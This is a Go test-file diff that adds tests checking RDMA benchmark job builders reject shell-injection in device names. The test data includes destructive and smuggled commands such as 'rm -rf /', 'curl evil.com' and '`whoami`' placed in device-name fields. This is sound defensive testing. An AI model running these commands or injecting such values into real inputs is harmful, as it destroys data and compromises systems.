@@ -2,6 +2,7 @@ package rdma
 
 import (
 	"math"
+	"strings"
 	"testing"
 )
 
@@ -76,5 +77,59 @@ func TestParseIBWriteBW(t *testing.T) {
 				t.Errorf("got %.1f Gbps, want %.1f Gbps", got, tt.wantGbps)
 			}
 		})
+	}
+}
+
+func TestWEPClientScriptRejectsInvalidDeviceNames(t *testing.T) {
+	tests := []struct {
+		name    string
+		devices []string
+		reject  string
+	}{
+		{
+			name:    "single-quote injection",
+			devices: []string{"mlx5_0", "'; rm -rf / #", "mlx5_1"},
+			reject:  "rm -rf",
+		},
+		{
+			name:    "semicolon injection",
+			devices: []string{"mlx5_0", "mlx5_0; curl evil.com"},
+			reject:  "curl",
+		},
+		{
+			name:    "backtick injection",
+			devices: []string{"`whoami`"},
+			reject:  "whoami",
+		},
+		{
+			name:    "valid devices only",
+			devices: []string{"mlx5_0", "mlx5_1", "ibp0"},
+			reject:  "",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			job := NewRDMAWEPJob(180, 100, tt.devices, []int{0, 1, 2})
+			cmd := job.clientScript("10.0.0.1")
+			script := strings.Join(cmd, " ")
+			if tt.reject != "" && strings.Contains(script, tt.reject) {
+				t.Errorf("script contains rejected payload %q:\n%s", tt.reject, script)
+			}
+		})
+	}
+}
+
+func TestRDMABandwidthJobRejectsInvalidDevice(t *testing.T) {
+	job := &RDMABandwidthJob{
+		Duration: 10,
+		Device:   "mlx5_0; rm -rf /",
+		UseCUDA:  0,
+	}
+	args := job.buildArgs()
+	for _, arg := range args {
+		if strings.Contains(arg, "rm -rf") {
+			t.Error("buildArgs contains injected payload")
+		}
 	}
 }
